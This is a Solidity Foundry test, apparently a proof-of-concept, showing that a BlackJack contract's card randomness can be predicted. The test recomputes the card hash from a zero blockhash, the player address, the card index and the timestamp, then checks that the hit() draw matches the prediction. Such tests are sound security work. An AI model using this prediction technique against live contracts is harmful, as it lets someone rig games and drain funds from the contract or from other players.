// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/blackjack.sol";

contract BlackJackWeakPRNGTest is Test {
    BlackJack public bj;
    address public player;
    uint256 constant FIXED_BLOCK = 100;
    uint256 constant FIXED_TS = 1000;

    function isBlackjackHand(uint8 card1, uint8 card2) internal pure returns (bool) {
        uint8 rank1 = card1 % 13;
        uint8 rank2 = card2 % 13;
        return 
            (rank1 == 0 && rank2 >= 9 && rank2 <= 12) || 
            (rank2 == 0 && rank1 >= 9 && rank1 <= 12);
    }

    function setUp() public {
        vm.warp(FIXED_TS);
        vm.roll(FIXED_BLOCK);
        bj = new BlackJack();
        
        // Find player without initial blackjack
        for (uint160 i = 1; i <= 1000; i++) {
            address candidate = address(i);
            bytes32 hash0 = keccak256(abi.encodePacked(uint256(0), candidate, uint8(0), FIXED_TS));
            uint8 card0 = uint8(uint256(hash0) % 52);
            bytes32 hash2 = keccak256(abi.encodePacked(uint256(0), candidate, uint8(2), FIXED_TS));
            uint8 card2 = uint8(uint256(hash2) % 52);

            if (!isBlackjackHand(card0, card2)) {
                player = candidate;
                break;
            }
        }
        require(player != address(0), "No suitable player found");
        vm.deal(player, 10 ether);
    }

    function test_WeakPRNG() public {
        vm.startPrank(player);

        // Precompute next card (cardNumber=3) with zero blockhash
        bytes32 predictionHash = keccak256(
            abi.encodePacked(uint256(0), player, uint8(3), FIXED_TS)
        );
        uint8 expectedCard = uint8(uint256(predictionHash) % 52);

        console.log("--- BEFORE-Trigger ---");
        console.log("Predicted next card:", expectedCard);

        // Start game with sufficient bet
        bj.deal{value: 1 ether}();

        // Log initial hand state
        uint8 cardsNum = uint8(bj.getPlayerCardsNumber());  // Fixed: cast to uint8
        console.log("Player hand after deal:");
        for (uint8 i = 0; i < cardsNum; i++) {
            console.log("Card",i,":", bj.getPlayerCard(i));
        }

        console.log("--- Trigger Hit ---");
        bj.hit(); // Vulnerability trigger

        console.log("--- AFTER-Trigger ---");
        cardsNum = uint8(bj.getPlayerCardsNumber());  // Fixed: cast to uint8
        uint8 lastCard = bj.getPlayerCard(uint8(cardsNum - 1));  // Fixed: cast index
        console.log("Actual drawn card:", lastCard);

        // Vulnerability verification
        if (lastCard == expectedCard) {
            console.log("Vulnerability Exists: Weak PRNG allows predicting next card");
        } else {
            console.log("Vulnerability not Exist: Cards don't match prediction");
        }

        vm.stopPrank();
        // Final test assertion remains for correctness check
        assertEq(lastCard, expectedCard, "Weak PRNG: Drawn card did not match prediction");
    }
}